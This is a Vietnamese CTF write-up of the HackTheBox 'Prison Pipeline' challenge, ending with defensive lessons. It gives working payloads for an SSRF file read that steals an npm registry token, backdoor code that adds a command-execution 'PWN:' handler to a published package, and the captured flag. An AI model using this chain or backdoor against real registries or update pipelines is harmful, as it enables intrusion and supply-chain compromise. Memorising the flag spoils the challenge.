# Prison Pipeline

**Danh mục:** misc · **Độ khó:** medium · **Tác giả:** makelaris · **Nền tảng:** HackTheBox
**Mục tiêu:** `http://154.57.164.82:31916` · **Flag:** `HTB{pr1s0n_br34k_w1th_supply_ch41n!_561be77f7a5a0d4c8b69583ce2fbe1ad}`

---

## 1. Tổng quan

Challenge mô phỏng một hệ thống quản lý hồ sơ tù nhân ("record management system") của một nhà tù. Nhiệm vụ: xâm nhập mạng nội bộ của nhà tù và vô hiệu hóa phòng thủ (đọc flag). Tên challenge gợi ý về **"pipeline"** — ở đây là pipeline cập nhật package npm: một cronjob chạy lặp lại `npm outdated`/`npm update` cho package nội bộ `prisoner-db` từ một npm registry riêng (verdaccio). Toàn bộ chuỗi khai thác là một **supply-chain attack** kinh điển: lợi dụng SSRF đọc file để lấy token registry, publish package độc hại, và để cronjob tự cài nó.

## 2. Phân tích mã nguồn

### 2.1. Ứng dụng web (Node.js/Express, port 5000)

`challenge/application/routes/index.js`:

```js
router.get('/api/prisoners', ...);                 // liệt kê tù nhân
router.get('/api/prisoners/:id', ...);             // đọc 1 hồ sơ
router.post('/api/prisoners/import', async (req, res, next) => {
    const { url } = req.body;
    ...
    let prisoner_id = await db.importPrisoner(url);
    ...
});
```

`challenge/prisoner-db/index.js` — `importPrisoner(url)` gọi `curl.get(url)` (node-libcurl, `FOLLOWLOCATION=true`), lấy **body phản hồi** và ghi thành file `PIP-XXXXXX.yaml` trong `/app/prisoner-repository`, đồng thời thêm id vào `index.json`. `getPrisoner(id)` trả về chính nội dung file qua trường `raw`:

```js
getPrisoner(id) {
    ...
    prisoner = { id: id, raw: this.readYAML(this.repository + '/' + id + '.yaml') };
    ...
}
```

→ **Bất kỳ URL nào cũng được app tự fetch** (SSRF), và nội dung phản hồi **được lưu lại rồi đọc lại qua API**.

### 2.2. Nginx (port 1337)

```nginx
server { listen 1337; server_name registry.prison-pipeline.htb;
    location / { proxy_pass http://localhost:4873/; ... } }   # -> verdaccio

server { listen 1337; default_server;
    location / { proxy_pass http://localhost:5000/; ... } }   # -> app
```

Hai vhost trên cùng cổng 1337: registry riêng (verdaccio) và app. Từ ngoài, gửi `Host: registry.prison-pipeline.htb` là chạm được verdaccio.

### 2.3. Verdaccio (npm registry riêng, port 4873, v5.31.0)

`config/verdaccio.yaml`:

```yaml
auth:
  htpasswd:
    file: ./htpasswd
    max_users: -1          # cấm đăng ký user mới
packages:
  'prisoner-*':
    access: $all
    publish: $authenticated   # publish cần đăng nhập
```

`config/setup-registry.sh` tạo user `registry` với **password ngẫu nhiên** rồi publish `prisoner-db@1.0.0` — nghĩa là registry chỉ có package nội bộ `prisoner-db` và user `registry`.

### 2.4. Cronjob (vòng lặp 30 giây, user `node`)

`config/cronjob.sh`:

```bash
while true; do
    OUTDATED=$(npm --registry http://localhost:4873 outdated prisoner-db)
    if [[ -n "$OUTDATED" ]]; then
        npm --registry http://localhost:4873 update prisoner-db   # chạy lifecycle scripts!
        pm2 restart prison-pipeline
    fi
    sleep 30
done
```

→ Nếu registry có version mới hơn `prisoner-db`, cronjob sẽ `npm update` — **npm chạy các script `preinstall`/`install`/`postinstall` của package vừa tải** với quyền user `node` — rồi restart app.

### 2.5. Flag

```dockerfile
COPY flag.txt /root/flag
RUN gcc -o /readflag /readflag.c && chmod 4755 /readflag   # setuid root
```

`config/readflag.c`: `setuid(0); system("cat /root/flag");` → `/readflag` là binary **setuid root** mà bất kỳ user nào cũng chạy được để đọc flag.

## 3. Lỗ hổng

1. **SSRF → arbitrary file read** tại `POST /api/prisoners/import`: node-libcurl hỗ trợ giao thức `file://`, nên có thể đọc mọi file mà user `node` đọc được; nội dung trả về được lưu thành hồ sơ tù nhân và đọc lại qua `GET /api/prisoners/:id`.
2. **Supply-chain attack qua npm registry + cronjob**: token verdaccio nằm trong `/home/node/.npmrc` (do `npm adduser` ghi khi build). Đọc được token → publish `prisoner-db@1.0.1` độc hại lên registry → cronjob tự `npm update` (chạy script của package) → **RCE với quyền user `node`** → dùng `/readflag` (setuid root) để đọc flag.

## 4. Khai thác

### Bước 1 — SSRF đọc `/home/node/.npmrc`

```
POST /api/prisoners/import
{"url": "file:///home/node/.npmrc"}
```

→ phản hồi trả `prisoner_id`; đọc hồ sơ đó:

```json
{"id":"PIP-749760","raw":"//localhost:4873/:_authToken=\"MWZlMmI1OTRiZjMwNTJkMjYwNWZhYTE1NGJlNTVjZDQ6...\""}
```

→ có được token `_authToken` của user `registry`.

### Bước 2 — Truy cập registry từ ngoài

Nginx định tuyến theo `Host`, nên chạy một proxy local (127.0.0.1:4873) chuyển tiếp tới `154.57.164.64:31567` kèm header `Host: registry.prison-pipeline.htb`. Kiểm tra:

```
GET http://localhost:4873/prisoner-db  →  {"name":"prisoner-db","versions":{...},"dist-tags":{"latest":"1.0.0"}}
```

### Bước 3 — Publish `prisoner-db@1.0.1` độc hại

Sửa `challenge/prisoner-db/curl.js`: thêm giao thức `PWN:` chạy lệnh tùy ý:

```js
const { execSync } = require('child_process');
...
if (url.startsWith('PWN:')) {
    const cmd = url.substring(4);
    const output = execSync(cmd).toString();
    resolve({ statusCode: 200, body: output, headers: new Map() });
}
```

`package.json` giữ nguyên dependencies (`js-yaml ^4.1.0`, `node-libcurl 4.0.0`) để npm không phải rebuild native module. Ghi `.npmrc` với token vừa đánh cắp rồi publish:

```
//localhost:4873/:_authToken="MWZl..."
npm publish --registry http://localhost:4873
→ + prisoner-db@1.0.1
```

(Lưu ý: verdaccio khi trả packument sẽ viết lại `dist.tarball` theo host của client — client là cronjob trong container gọi `localhost:4873` nên tarball tải về được.)

### Bước 4 — Đợi cronjob cài package độc hại

Cronjob (30s/lần): `npm outdated` thấy `latest=1.0.1 > 1.0.0` → `npm update prisoner-db` cài `curl.js` độc hại vào `/app/node_modules` → `pm2 restart prison-pipeline` → app chạy với module mới.

### Bước 5 — RCE và đọc flag

```
POST /api/prisoners/import
{"url": "PWN:/readflag"}
→ {"message":"Prisoner data imported successfully","prisoner_id":"PIP-127639"}
```

`/readflag` (setuid root) in flag; output được lưu thành hồ sơ tù nhân:

```
GET /api/prisoners/PIP-127639
→ {"id":"PIP-127639","raw":"HTB{pr1s0n_br34k_w1th_supply_ch41n!_561be77f7a5a0d4c8b69583ce2fbe1ad}"}
```

## 5. Flag

```
HTB{pr1s0n_br34k_w1th_supply_ch41n!_561be77f7a5a0d4c8b69583ce2fbe1ad}
```

## 6. Kết luận & bài học

- **SSRF không chỉ là truy cập nội bộ**: `file://` biến SSRF thành arbitrary file read, từ đó đánh cắp bí mật (token, key) nằm trên đĩa.
- **Registry npm riêng là bề mặt tấn công supply-chain**: pipeline tự động cập nhật dependency (`npm update` + restart) mà không kiểm tra nguồn gốc là điểm chết người — attacker chỉ cần publish một version độc hại lên đúng registry mà pipeline đang tin tưởng (token bị lộ qua SSRF). Script lifecycle của npm chạy với quyền của process `npm`, mở đường RCE.
- **Phòng thủ**: registry riêng nên khóa publish theo IP/token ngắn hạn; cronjob cập nhật package nên dùng `--ignore-scripts` hoặc kiểm tra checksum; quyền user `node` không nên có quyền ghi vào nơi chứa bí mật; file `.npmrc` chứa token không nên nằm trong vùng app đọc được.
- Chuỗi khai thác hoàn chỉnh: **SSRF (file read) → đánh cắp token registry → publish package độc hại → pipeline tự cài → RCE → setuid binary đọc flag**.
